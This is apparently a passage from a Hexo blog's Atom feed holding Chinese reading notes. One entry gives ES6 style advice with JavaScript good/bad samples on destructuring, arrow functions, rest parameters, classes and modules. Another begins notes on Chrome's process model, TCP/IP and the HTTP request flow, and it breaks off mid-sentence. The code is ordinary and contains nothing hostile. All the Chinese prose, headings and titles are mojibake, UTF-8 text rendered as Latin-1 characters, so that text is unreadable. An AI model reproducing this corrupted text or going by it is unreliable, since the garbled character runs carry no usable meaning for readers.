title="2ã€å­—ç¬¦ä¸²"></a>2ã€å­—ç¬¦ä¸²</h2><p>é™æ€å­—ç¬¦ä¸²ä¸€å¾‹ä½¿ç”¨å•å¼•å·æˆ–åå¼•å·ï¼Œä¸ä½¿ç”¨åŒå¼•å·ã€‚åŠ¨æ€å­—ç¬¦ä¸²ä½¿ç”¨åå¼•å·ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="keyword">const</span> a = <span class="string">&#x27;foobar&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> b = <span class="string">`foo<span class="subst">$&#123;a&#125;</span>bar`</span>;</span><br></pre></td></tr></table></figure><h2 id="3ã€è§£æ„èµ‹å€¼"><a href="#3ã€è§£æ„èµ‹å€¼" class="headerlink" title="3ã€è§£æ„èµ‹å€¼"></a>3ã€è§£æ„èµ‹å€¼</h2><p>ä½¿ç”¨æ•°ç»„æˆå‘˜å¯¹å˜é‡èµ‹å€¼æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨è§£æ„èµ‹å€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="keyword">const</span> first = arr[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">const</span> second = arr[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="keyword">const</span> [first, second] = arr;</span><br></pre></td></tr></table></figure><p>å‡½æ•°çš„å‚æ•°å¦‚æœæ˜¯å¯¹è±¡çš„æˆå‘˜ï¼Œä¼˜å…ˆä½¿ç”¨è§£æ„èµ‹å€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFullName</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> firstName = user.firstName;</span><br><span class="line">  <span class="keyword">const</span> lastName = user.lastName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFullName</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; firstName, lastName &#125; = obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// best</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFullName</span>(<span class="params">&#123; firstName, lastName &#125;</span>) </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœå‡½æ•°è¿”å›å¤šä¸ªå€¼ï¼Œä¼˜å…ˆä½¿ç”¨å¯¹è±¡çš„è§£æ„èµ‹å€¼ï¼Œè€Œä¸æ˜¯æ•°ç»„çš„è§£æ„èµ‹å€¼ã€‚è¿™æ ·ä¾¿äºä»¥åæ·»åŠ è¿”å›å€¼ï¼Œä»¥åŠæ›´æ”¹è¿”å›å€¼çš„é¡ºåºã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">processInput</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [left, right, top, bottom];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">processInput</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; left, right, top, bottom &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; left, right &#125; = processInput(input);</span><br></pre></td></tr></table></figure><h2 id="4ã€å¯¹è±¡"><a href="#4ã€å¯¹è±¡" class="headerlink" title="4ã€å¯¹è±¡"></a>4ã€å¯¹è±¡</h2><p>å•è¡Œå®šä¹‰çš„å¯¹è±¡ï¼Œæœ€åä¸€ä¸ªæˆå‘˜ä¸ä»¥é€—å·ç»“å°¾ã€‚å¤šè¡Œå®šä¹‰çš„å¯¹è±¡ï¼Œæœ€åä¸€ä¸ªæˆå‘˜ä»¥é€—å·ç»“å°¾ã€‚</p><p>å¯¹è±¡å°½é‡é™æ€åŒ–ï¼Œä¸€æ—¦å®šä¹‰ï¼Œå°±ä¸å¾—éšæ„æ·»åŠ æ–°çš„å±æ€§ã€‚å¦‚æœæ·»åŠ å±æ€§ä¸å¯é¿å…ï¼Œè¦ä½¿ç”¨<code>Object.assign</code>æ–¹æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="keyword">const</span> a = &#123;&#125;;</span><br><span class="line">a.x = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if reshape unavoidable</span></span><br><span class="line"><span class="keyword">const</span> a = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.assign(a, &#123; <span class="attr">x</span>: <span class="number">3</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="keyword">const</span> a = &#123; <span class="attr">x</span>: <span class="literal">null</span> &#125;;</span><br><span class="line">a.x = <span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>å¦‚æœå¯¹è±¡çš„å±æ€§åæ˜¯åŠ¨æ€çš„ï¼Œå¯ä»¥åœ¨åˆ›é€ å¯¹è±¡çš„æ—¶å€™ï¼Œä½¿ç”¨å±æ€§è¡¨è¾¾å¼å®šä¹‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="number">5</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;San Francisco&#x27;</span>,</span><br><span class="line">  [getKey(<span class="string">&#x27;enabled&#x27;</span>)]: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="5ã€æ•°ç»„"><a href="#5ã€æ•°ç»„" class="headerlink" title="5ã€æ•°ç»„"></a>5ã€æ•°ç»„</h2><p>ä½¿ç”¨æ‰©å±•è¿ç®—ç¬¦ï¼ˆâ€¦ï¼‰æ‹·è´æ•°ç»„ã€‚</p><p>ä½¿ç”¨ Array.from æ–¹æ³•ï¼Œå°†ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡è½¬ä¸ºæ•°ç»„ã€‚</p><h2 id="6ã€å‡½æ•°"><a href="#6ã€å‡½æ•°" class="headerlink" title="6ã€å‡½æ•°"></a>6ã€å‡½æ•°</h2><p>ç«‹å³æ‰§è¡Œå‡½æ•°å¯ä»¥å†™æˆç®­å¤´å‡½æ•°çš„å½¢å¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Welcome to the Internet.&#x27;</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>é‚£äº›ä½¿ç”¨åŒ¿åå‡½æ•°å½“ä½œå‚æ•°çš„åœºåˆï¼Œå°½é‡ç”¨ç®­å¤´å‡½æ•°ä»£æ›¿ã€‚å› ä¸ºè¿™æ ·æ›´ç®€æ´ï¼Œè€Œä¸”ç»‘å®šäº† thisã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// best</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].map(<span class="function"><span class="params">x</span> =&gt;</span> x * x);</span><br></pre></td></tr></table></figure><p>ç®­å¤´å‡½æ•°å–ä»£<code>Function.prototype.bind</code>ï¼Œä¸åº”å†ç”¨ self/_this/that ç»‘å®š thisã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="keyword">const</span> self = <span class="built_in">this</span>;</span><br><span class="line"><span class="keyword">const</span> boundMethod = <span class="function"><span class="keyword">function</span>(<span class="params">...params</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> method.apply(self, params);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// acceptable</span></span><br><span class="line"><span class="keyword">const</span> boundMethod = method.bind(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// best</span></span><br><span class="line"><span class="keyword">const</span> boundMethod = <span class="function">(<span class="params">...params</span>) =&gt;</span> method.apply(<span class="built_in">this</span>, params);</span><br></pre></td></tr></table></figure><p>ä¸è¦åœ¨å‡½æ•°ä½“å†…ä½¿ç”¨ arguments å˜é‡ï¼Œä½¿ç”¨ rest è¿ç®—ç¬¦ï¼ˆâ€¦ï¼‰ä»£æ›¿ã€‚å› ä¸º rest è¿ç®—ç¬¦æ˜¾å¼è¡¨æ˜ä½ æƒ³è¦è·å–å‚æ•°ï¼Œè€Œä¸” arguments æ˜¯ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œè€Œ rest è¿ç®—ç¬¦å¯ä»¥æä¾›ä¸€ä¸ªçœŸæ­£çš„æ•°ç»„ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">concatenateAll</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">  <span class="keyword">return</span> args.join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">concatenateAll</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> args.join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨é»˜è®¤å€¼è¯­æ³•è®¾ç½®å‡½æ•°å‚æ•°çš„é»˜è®¤å€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleThings</span>(<span class="params">opts</span>) </span>&#123;</span><br><span class="line">  opts = opts || &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleThings</span>(<span class="params">opts = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7ã€Map-ç»“æ„"><a href="#7ã€Map-ç»“æ„" class="headerlink" title="7ã€Map ç»“æ„"></a>7ã€Map ç»“æ„</h2><p>æ³¨æ„åŒºåˆ† Object å’Œ Mapï¼Œåªæœ‰æ¨¡æ‹Ÿç°å®ä¸–ç•Œçš„å®ä½“å¯¹è±¡æ—¶ï¼Œæ‰ä½¿ç”¨ Objectã€‚å¦‚æœåªæ˜¯éœ€è¦<code>key: value</code>çš„æ•°æ®ç»“æ„ï¼Œä½¿ç”¨ Map ç»“æ„ã€‚å› ä¸º Map æœ‰å†…å»ºçš„éå†æœºåˆ¶ã€‚</p><h2 id="8ã€Class"><a href="#8ã€Class" class="headerlink" title="8ã€Class"></a>8ã€Class</h2><p>æ€»æ˜¯ç”¨ Classï¼Œå–ä»£éœ€è¦ prototype çš„æ“ä½œã€‚å› ä¸º Class çš„å†™æ³•æ›´ç®€æ´ï¼Œæ›´æ˜“äºç†è§£ã€‚</p><p>ä½¿ç”¨<code>extends</code>å®ç°ç»§æ‰¿ï¼Œå› ä¸ºè¿™æ ·æ›´ç®€å•ï¼Œä¸ä¼šæœ‰ç ´å<code>instanceof</code>è¿ç®—çš„å±é™©ã€‚</p><h2 id="9ã€æ¨¡å—"><a href="#9ã€æ¨¡å—" class="headerlink" title="9ã€æ¨¡å—"></a>9ã€æ¨¡å—</h2><p>ä½¿ç”¨<code>import</code>å–ä»£<code>require</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="keyword">const</span> moduleA = <span class="built_in">require</span>(<span class="string">&#x27;moduleA&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> func1 = moduleA.func1;</span><br><span class="line"><span class="keyword">const</span> func2 = moduleA.func2;</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="keyword">import</span> &#123; func1, func2 &#125; <span class="keyword">from</span> <span class="string">&#x27;moduleA&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>export</code>å–ä»£<code>module.exports</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// commonJSçš„å†™æ³•</span></span><br><span class="line"><span class="keyword">var</span> React = <span class="built_in">require</span>(<span class="string">&#x27;react&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Breadcrumbs = React.createClass(&#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">nav</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = Breadcrumbs;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6çš„å†™æ³•</span></span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Breadcrumbs</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">nav</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Breadcrumbs;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ¨¡å—é»˜è®¤è¾“å‡ºä¸€ä¸ªå‡½æ•°ï¼Œå‡½æ•°åçš„é¦–å­—æ¯åº”è¯¥å°å†™ã€‚å¦‚æœæ¨¡å—é»˜è®¤è¾“å‡ºä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡åçš„é¦–å­—æ¯åº”è¯¥å¤§å†™ã€‚</p><h2 id="10ã€ESLint-çš„ä½¿ç”¨"><a href="#10ã€ESLint-çš„ä½¿ç”¨" class="headerlink" title="10ã€ESLint çš„ä½¿ç”¨"></a>10ã€ESLint çš„ä½¿ç”¨</h2><h1 id="è¯»æ‡‚-ECMAScript-è§„æ ¼"><a href="#è¯»æ‡‚-ECMAScript-è§„æ ¼" class="headerlink" title="è¯»æ‡‚ ECMAScript è§„æ ¼"></a>è¯»æ‡‚ ECMAScript è§„æ ¼</h1><p>â€¦(todo)</p><h1 id="å¼‚æ­¥éå†å™¨"><a href="#å¼‚æ­¥éå†å™¨" class="headerlink" title="å¼‚æ­¥éå†å™¨"></a>å¼‚æ­¥éå†å™¨</h1><p>â€¦(todo)</p><h1 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h1><p>â€¦(todo)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ¬æ–‡æ˜¯é˜…è¯»é˜®ä¸€å³°è€å¸ˆã€ŠECMAScript 6å…¥é—¨ã€‹çš„ç¬”è®°(ä¸»è¦æ˜¯è®°çš„çŸ¥è¯†ç‚¹ï¼Œå¤–åŠ è‡ªå·±çš„ä¸€ç‚¹æ€è€ƒ)ï¼Œæ–¹ä¾¿ä»Šåå­¦ä¹ å¤ä¹ es6ã€‚&lt;/p&gt;
&lt;h1</summary>
      
    
    
    
    <category term="é˜…è¯»ç¬”è®°" scheme="http://example.com/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ES6" scheme="http://example.com/tags/ES6/"/>
    
  </entry>
  
  <entry>
    <title>ã€é˜…è¯»ç¬”è®°ã€‘â€” â€” æµè§ˆå™¨å·¥ä½œåŸç†ï¼ˆæå®¢æ—¶é—´ï¼‰</title>
    <link href="http://example.com/2021/06/12/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%88%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%EF%BC%89/"/>
    <id>http://example.com/2021/06/12/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%88%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%EF%BC%89/</id>
    <published>2021-06-12T19:35:37.000Z</published>
    <updated>2021-10-07T12:48:29.351Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬æ–‡æ˜¯<a href="https://time.geekbang.org/column/intro/100033601">æå®¢æ—¶é—´â€”â€”æµè§ˆå™¨å·¥ä½œåŸç†ä¸å®è·µ</a> ä¸“æ çš„é˜…è¯»ç¬”è®°ï¼Œä»¥ä¾¿åç»­å¤ä¹ å›é¡¾ã€‚ï¼ˆä¾µæƒåˆ ï¼‰</p><h1 id="å®è§‚è§†è§’ä¸‹çš„æµè§ˆå™¨"><a href="#å®è§‚è§†è§’ä¸‹çš„æµè§ˆå™¨" class="headerlink" title="å®è§‚è§†è§’ä¸‹çš„æµè§ˆå™¨"></a>å®è§‚è§†è§’ä¸‹çš„æµè§ˆå™¨</h1><h2 id="å¤šè¿›ç¨‹æµè§ˆå™¨æ—¶ä»£"><a href="#å¤šè¿›ç¨‹æµè§ˆå™¨æ—¶ä»£" class="headerlink" title="å¤šè¿›ç¨‹æµè§ˆå™¨æ—¶ä»£"></a>å¤šè¿›ç¨‹æµè§ˆå™¨æ—¶ä»£</h2><p>æœ€æ–°çš„ Chrome è¿›ç¨‹æ¶æ„å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2021/06/13/8ydCa7AL9ZuH4qh.jpg" alt="Snipaste_2021-06-13_19-43-47.jpg"></p><p>è¿™å‡ ä¸ªè¿›ç¨‹çš„åŠŸèƒ½ï¼š</p><ul><li><strong>æµè§ˆå™¨è¿›ç¨‹</strong>ã€‚ä¸»è¦è´Ÿè´£ç•Œé¢æ˜¾ç¤ºã€ç”¨æˆ·äº¤äº’ã€å­è¿›ç¨‹ç®¡ç†ï¼ŒåŒæ—¶æä¾›å­˜å‚¨ç­‰åŠŸèƒ½ã€‚</li><li><strong>æ¸²æŸ“è¿›ç¨‹</strong>ã€‚æ ¸å¿ƒä»»åŠ¡æ˜¯å°† HTMLã€CSS å’Œ JavaScript è½¬æ¢ä¸ºç”¨æˆ·å¯ä»¥ä¸ä¹‹äº¤äº’çš„ç½‘é¡µï¼Œæ’ç‰ˆå¼•æ“ Blink å’Œ JavaScript å¼•æ“ V8 éƒ½æ˜¯è¿è¡Œåœ¨è¯¥è¿›ç¨‹ä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒChrome ä¼šä¸ºæ¯ä¸ª Tab æ ‡ç­¾åˆ›å»ºä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ã€‚å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œæ¸²æŸ“è¿›ç¨‹éƒ½æ˜¯è¿è¡Œåœ¨æ²™ç®±æ¨¡å¼ä¸‹ã€‚</li><li><strong>GPU è¿›ç¨‹</strong>ã€‚å…¶å®ï¼ŒChrome åˆšå¼€å§‹å‘å¸ƒçš„æ—¶å€™æ˜¯æ²¡æœ‰ GPU è¿›ç¨‹çš„ã€‚è€Œ GPU çš„ä½¿ç”¨åˆè¡·æ˜¯ä¸ºäº†å®ç° 3D CSS çš„æ•ˆæœï¼Œåªæ˜¯éšåç½‘é¡µã€Chrome çš„ UI ç•Œé¢éƒ½é€‰æ‹©é‡‡ç”¨ GPU æ¥ç»˜åˆ¶ï¼Œè¿™ä½¿å¾— GPU æˆä¸ºæµè§ˆå™¨æ™®éçš„éœ€æ±‚ã€‚æœ€åï¼ŒChrome åœ¨å…¶å¤šè¿›ç¨‹æ¶æ„ä¸Šä¹Ÿå¼•å…¥äº† GPU è¿›ç¨‹ã€‚</li><li><strong>ç½‘ç»œè¿›ç¨‹</strong>ã€‚ä¸»è¦è´Ÿè´£é¡µé¢çš„ç½‘ç»œèµ„æºåŠ è½½ï¼Œä¹‹å‰æ˜¯ä½œä¸ºä¸€ä¸ªæ¨¡å—è¿è¡Œåœ¨æµè§ˆå™¨è¿›ç¨‹é‡Œé¢çš„ï¼Œç›´è‡³æœ€è¿‘æ‰ç‹¬ç«‹å‡ºæ¥ï¼Œæˆä¸ºä¸€ä¸ªå•ç‹¬çš„è¿›ç¨‹ã€‚</li><li><strong>æ’ä»¶è¿›ç¨‹</strong>ã€‚ä¸»è¦æ˜¯è´Ÿè´£æ’ä»¶çš„è¿è¡Œï¼Œå› æ’ä»¶æ˜“å´©æºƒï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡æ’ä»¶è¿›ç¨‹æ¥éš”ç¦»ï¼Œä»¥ä¿è¯æ’ä»¶è¿›ç¨‹å´©æºƒä¸ä¼šå¯¹æµè§ˆå™¨å’Œé¡µé¢é€ æˆå½±å“ã€‚</li></ul><p><strong>æ‰€ä»¥æ‰“å¼€ 1 ä¸ªé¡µé¢è‡³å°‘éœ€è¦ 1 ä¸ªç½‘ç»œè¿›ç¨‹ã€1 ä¸ªæµè§ˆå™¨è¿›ç¨‹ã€1 ä¸ª GPU è¿›ç¨‹ä»¥åŠ 1 ä¸ªæ¸²æŸ“è¿›ç¨‹ï¼Œå…± 4 ä¸ª</strong>ï¼›å¦‚æœæ‰“å¼€çš„é¡µé¢æœ‰è¿è¡Œæ’ä»¶çš„è¯ï¼Œè¿˜éœ€è¦å†åŠ ä¸Š 1 ä¸ªæ’ä»¶è¿›ç¨‹ã€‚</p><h2 id="é¡µé¢æ–‡ä»¶å¦‚ä½•å®Œæ•´é€è¾¾æµè§ˆå™¨ï¼Ÿ"><a href="#é¡µé¢æ–‡ä»¶å¦‚ä½•å®Œæ•´é€è¾¾æµè§ˆå™¨ï¼Ÿ" class="headerlink" title="é¡µé¢æ–‡ä»¶å¦‚ä½•å®Œæ•´é€è¾¾æµè§ˆå™¨ï¼Ÿ"></a>é¡µé¢æ–‡ä»¶å¦‚ä½•å®Œæ•´é€è¾¾æµè§ˆå™¨ï¼Ÿ</h2><h3 id="IPï¼šæŠŠæ•°æ®åŒ…é€è¾¾ç›®çš„ä¸»æœº"><a href="#IPï¼šæŠŠæ•°æ®åŒ…é€è¾¾ç›®çš„ä¸»æœº" class="headerlink" title="IPï¼šæŠŠæ•°æ®åŒ…é€è¾¾ç›®çš„ä¸»æœº"></a>IPï¼šæŠŠæ•°æ®åŒ…é€è¾¾ç›®çš„ä¸»æœº</h3><p>ç›´æ¥è§å›¾ç‰‡ï¼š</p><p><img src="https://i.loli.net/2021/06/13/9PEtrafCURos1Qb.jpg" alt="Snipaste_2021-06-13_19-49-45.jpg"></p><h3 id="UDPï¼šæŠŠæ•°æ®åŒ…é€è¾¾åº”ç”¨ç¨‹åº"><a href="#UDPï¼šæŠŠæ•°æ®åŒ…é€è¾¾åº”ç”¨ç¨‹åº" class="headerlink" title="UDPï¼šæŠŠæ•°æ®åŒ…é€è¾¾åº”ç”¨ç¨‹åº"></a>UDPï¼šæŠŠæ•°æ®åŒ…é€è¾¾åº”ç”¨ç¨‹åº</h3><p>IP é€šè¿‡ IP åœ°å€ä¿¡æ¯æŠŠæ•°æ®åŒ…å‘é€ç»™æŒ‡å®šçš„ç”µè„‘ï¼Œè€Œ UDP é€šè¿‡ç«¯å£å·æŠŠæ•°æ®åŒ…åˆ†å‘ç»™æ­£ç¡®çš„ç¨‹åº</p><p><img src="https://i.loli.net/2021/06/13/rAfZg3J8RUFk1Vu.jpg" alt="Snipaste_2021-06-13_19-51-04.jpg"></p><h3 id="TCPï¼šæŠŠæ•°æ®å®Œæ•´åœ°é€è¾¾åº”ç”¨ç¨‹åº"><a href="#TCPï¼šæŠŠæ•°æ®å®Œæ•´åœ°é€è¾¾åº”ç”¨ç¨‹åº" class="headerlink" title="TCPï¼šæŠŠæ•°æ®å®Œæ•´åœ°é€è¾¾åº”ç”¨ç¨‹åº"></a>TCPï¼šæŠŠæ•°æ®å®Œæ•´åœ°é€è¾¾åº”ç”¨ç¨‹åº</h3><p>ä¸€ä¸ªå®Œæ•´çš„ TCP è¿æ¥çš„ç”Ÿå‘½å‘¨æœŸåŒ…æ‹¬äº†â€œ<strong>å»ºç«‹è¿æ¥</strong>â€â€œ<strong>ä¼ è¾“æ•°æ®</strong>â€å’Œâ€œ<strong>æ–­å¼€è¿æ¥</strong>â€ä¸‰ä¸ªé˜¶æ®µã€‚</p><p><img src="https://i.loli.net/2021/06/13/shdrBIkjAyg6Vot.jpg" alt="Snipaste_2021-06-13_19-52-42.jpg"></p><h2 id="æµè§ˆå™¨ç«¯å‘èµ·-HTTP-è¯·æ±‚æµç¨‹"><a href="#æµè§ˆå™¨ç«¯å‘èµ·-HTTP-è¯·æ±‚æµç¨‹" class="headerlink" title="æµè§ˆå™¨ç«¯å‘èµ· HTTP è¯·æ±‚æµç¨‹"></a>æµè§ˆå™¨ç«¯å‘èµ· HTTP è¯·æ±‚æµç¨‹</h2><p>å¦‚æœä½ åœ¨æµè§ˆå™¨åœ°å€æ é‡Œé”®å…¥æå®¢æ—¶é—´ç½‘ç«™çš„åœ°å€ï¼š<a href="http://time.geekbang.org/index.html%EF%BC%8C">http://time.geekbang.org/index.html</a></p><h3 id="æ„å»ºè¯·æ±‚"><a href="#æ„å»ºè¯·æ±‚" class="headerlink" title="æ„å»ºè¯·æ±‚"></a>æ„å»ºè¯·æ±‚</h3><p>é¦–å…ˆï¼Œæµè§ˆå™¨æ„å»º<strong>è¯·æ±‚è¡Œ</strong>ä¿¡æ¯ã€‚æ„å»ºå¥½åï¼Œæµè§ˆå™¨å‡†å¤‡å‘èµ·ç½‘ç»œè¯·æ±‚ã€‚</p><p><code>GET /index.html HTTP1.1</code></p><h3 id="æŸ¥æ‰¾ç¼“å­˜"><a href="#æŸ¥æ‰¾ç¼“å­˜" class="headerlink" title="æŸ¥æ‰¾ç¼“å­˜"></a>æŸ¥æ‰¾ç¼“å­˜</h3><p>åœ¨çœŸæ­£å‘èµ·ç½‘ç»œè¯·æ±‚ä¹‹å‰ï¼Œæµè§ˆå™¨ä¼šå…ˆåœ¨æµè§ˆå™¨ç¼“å­˜ä¸­æŸ¥è¯¢æ˜¯å¦æœ‰è¦è¯·æ±‚çš„æ–‡ä»¶ã€‚å…¶ä¸­ï¼Œ<strong>æµè§ˆå™¨ç¼“å­˜æ˜¯ä¸€ç§åœ¨æœ¬åœ°ä¿å­˜èµ„æºå‰¯æœ¬ï¼Œä»¥ä¾›ä¸‹æ¬¡è¯·æ±‚æ—¶ç›´æ¥ä½¿ç”¨çš„æŠ€æœ¯</strong>ã€‚</p><p>å½“æµè§ˆå™¨å‘ç°è¯·æ±‚çš„èµ„æºå·²ç»åœ¨æµè§ˆå™¨ç¼“å­˜ä¸­å­˜æœ‰å‰¯æœ¬ï¼Œå®ƒä¼šæ‹¦æˆªè¯·æ±‚ï¼Œè¿”å›è¯¥èµ„æºçš„å‰¯æœ¬ï¼Œå¹¶ç›´æ¥ç»“æŸè¯·æ±‚ï¼Œè€Œä¸ä¼šå†å»æºæœåŠ¡å™¨é‡æ–°ä¸‹è½½ã€‚ï¼ˆç¼“è§£æœåŠ¡å™¨ç«¯å‹åŠ›ï¼Œæå‡æ€§èƒ½ï¼‰</p><h3 id="å‡†å¤‡-IP-åœ°å€å’Œç«¯å£"><a href="#å‡†å¤‡-IP-åœ°å€å’Œç«¯å£" class="headerlink" title="å‡†å¤‡ IP åœ°å€å’Œç«¯å£"></a>å‡†å¤‡ IP åœ°å€å’Œç«¯å£</h3><p>æµè§ˆå™¨ä½¿ç”¨<strong>HTTP åè®®ä½œä¸ºåº”ç”¨å±‚åè®®</strong>ï¼Œç”¨æ¥å°è£…è¯·æ±‚çš„æ–‡æœ¬ä¿¡æ¯ï¼›å¹¶ä½¿ç”¨<strong>TCP/IP ä½œä¼ è¾“å±‚åè®®</strong>å°†å®ƒå‘åˆ°ç½‘ç»œä¸Šã€‚å› æ­¤<strong>HTTP 